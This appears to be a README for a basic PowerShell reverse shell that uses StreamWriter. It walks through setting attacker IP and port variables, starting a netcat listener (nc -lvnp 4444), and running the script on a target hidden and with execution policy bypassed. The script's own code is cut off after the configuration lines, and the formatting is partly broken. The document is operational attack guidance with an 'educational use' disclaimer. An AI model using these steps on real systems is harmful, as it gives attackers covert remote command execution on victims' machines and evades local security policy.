# Basic PowerShell Reverse Shell (StreamWriter)

This PowerShell script creates a **reverse shell** connection from a target computer back to your machine. It's a fundamental tool in ethical hacking and penetration testing, allowing you to **execute commands remotely** on a compromised system.

---

## How It Works

The script establishes an **outbound TCP connection** from the target to your attacker machine. Once connected, it acts as an interactive shell:

1.  **Listens for Commands:** It continuously waits for commands sent from your attacker machine.
2.  **Executes on Target:** It executes these commands on the target using `Invoke-Expression`.
3.  **Sends Output Back:** It sends the results of those commands (including errors) back to your listener.

This version uses `System.IO.StreamWriter` for efficient text-based communication.

---

## Setup & Usage

### 1. Configure the Script

Before deploying, **edit the script** to include your attacker machine's details:

* **`$AttackerIP`**: Your IP address (e.g., `"192.168.1.100"`)
* **`$AttackerPort`**: Your chosen listening port (e.g., `9001`)

```powershell
# --- Configuration ---
$AttackerIP = "10.10.10.10"; # <== REPLACE WITH YOUR IP
$AttackerPort = 4444;        # <== REPLACE WITH YOUR PORT
2. Start Your Listener (Attacker Machine)
Use Netcat (or nc) to listen for the incoming connection on your specified port:

Bash

nc -lvnp <Your_AttackerPort>
# Example: nc -lvnp 4444
3. Execute on Target (Target Machine)
Run the modified PowerShell script on the target. The following command is often used to execute it silently and bypass execution policies:

PowerShell

powershell.exe -NoP -NonI -W Hidden -Exec Bypass -File C:\Path\To\your_reverse_shell.ps1
(Replace C:\Path\To\your_reverse_shell.ps1 with the actual path.)

Interaction
Once the target connects, you'll gain an interactive PowerShell prompt in your Netcat listener. You can type commands like whoami or dir and see their output directly.

Important Considerations
Educational Use Only: This script is for authorized ethical hacking and educational purposes only. Never use it on systems without explicit, written permission.
Detection: Due to its nature, this script will likely be detected by antivirus (AV) and Endpoint Detection and Response (EDR) solutions.
Stability: This is a basic implementation; more robust reverse shells often include advanced features like encryption, better error handling, and obfuscation.
